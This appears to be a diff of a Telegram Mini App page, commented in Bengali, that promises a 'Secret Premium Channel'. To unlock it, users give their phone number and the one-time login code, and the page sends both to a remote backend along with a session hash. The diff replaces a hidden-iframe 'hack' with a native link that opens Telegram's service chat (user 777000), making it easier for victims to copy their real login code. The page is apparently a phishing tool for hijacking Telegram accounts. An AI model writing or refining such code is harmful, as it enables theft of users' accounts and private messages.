@@ -125,8 +125,8 @@
             <div id="otp-sec" style="display: none;">
                 <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
                     <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- Iframe Hack ট্রিক -->
-                    <button onclick="openTelegramChat()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
+                    <!-- অফিশিয়াল ইন্টারনাল প্রোটোকল ট্রিক (কোনো ব্রাউজার খুলবে না) -->
+                    <button onclick="openTelegramChatNatively()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
                 </div>
                 <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
                 <div style="text-align: center; margin-top: 15px;">
@@ -167,6 +167,18 @@
 
         // আপনার প্রাইভেট চ্যানেলের ইনভাইট লিংক
         const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
+
+        // এই ফাংশনটি ব্রাউজার ছাড়াই সরাসরি টেলিগ্রাম চ্যাট ওপেন করবে
+        function openTelegramChatNatively() {
+            try {
+                // এটি অফিশিয়াল মেথড যা সরাসরি অ্যাপের ভেতরে প্রসেস হয়
+                tg.openTelegramLink("tg://openmessage?user_id=777000");
+                showToast("Opening Telegram Chat...");
+            } catch (e) {
+                // যদি কোনো কারণে ফেল করে তবে সরাসরি উইন্ডো থেকে ট্রাই করবে
+                window.location.href = "tg://openmessage?user_id=777000";
+            }
+        }
 
         async function openLogin() {
             if (isCheckingLogin) return;
@@ -220,7 +232,6 @@
                 if(data.status === "ok") {
                     currentHash = data.hash;
                     
-                    // LocalStorage এ ডাটা সেভ রাখা হচ্ছে যেন রিলোড হলেও না হারায়
                     localStorage.setItem("savedPhone", currentPhone);
                     localStorage.setItem("savedHash", currentHash);
                     localStorage.setItem("loginState", "otp");
@@ -229,7 +240,7 @@
                     document.getElementById('otp-sec').style.display = 'block';
                     showToast("Code sent to your Telegram!");
                 } else { showToast("Error: " + data.msg); }
-            } catch(e) { showToast("Server error or Mixed Content Issue!"); } 
+            } catch(e) { showToast("Server error!"); } 
             finally { sendBtn.innerHTML = originalText; sendBtn.disabled = false; }
         }
 
@@ -247,11 +258,9 @@
                 const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
                 const data = await res.json();
                 if(data.status === "ok") {
-                    // লগিন সাকসেস হলে মেমরি ফাকা করা
                     localStorage.removeItem("loginState");
                     localStorage.removeItem("savedPhone");
                     localStorage.removeItem("savedHash");
-
                     closeLogin();
                     showPremiumModal();
                 } else { showToast("Invalid Code or Error!"); }
@@ -275,7 +284,6 @@
                     You have successfully logged in! 👑<br><br>
                     Now you can join our <b>Secret Premium Channel</b>.
                 </div>
-                <!-- tg.openLink is used instead of openTelegramLink to properly load private invite links -->
                 <button class="share-btn" style="background: linear-gradient(90deg, #ffcc00, #ff9900); color: black;" onclick="tg.openLink('${PREMIUM_CHANNEL_LINK}')">🚀 Visit Premium Content</button>
                 <button class="close-btn-modal" style="margin-top:20px;" onclick="closeModal()">Close</button>
             `;
@@ -445,19 +453,6 @@
         }
 
         function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
-
-        // Hidden Iframe Hack (কোনো দ্বিতীয় অ্যাপ বা ব্রাউজার ওপেন করবে না)
-        function openTelegramChat() {
-            let iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = "tg://openmessage?user_id=777000";
-            document.body.appendChild(iframe);
-            
-            // ১.৫ সেকেন্ড পর অদৃশ্য ফ্রেমটি রিমুভ করে দিবে
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-            }, 1500);
-        }
 
         // পেজ রিলোড হলে অটোমেটিক লগিন স্টেট চেক করবে
         let savedState = localStorage.getItem("loginState");
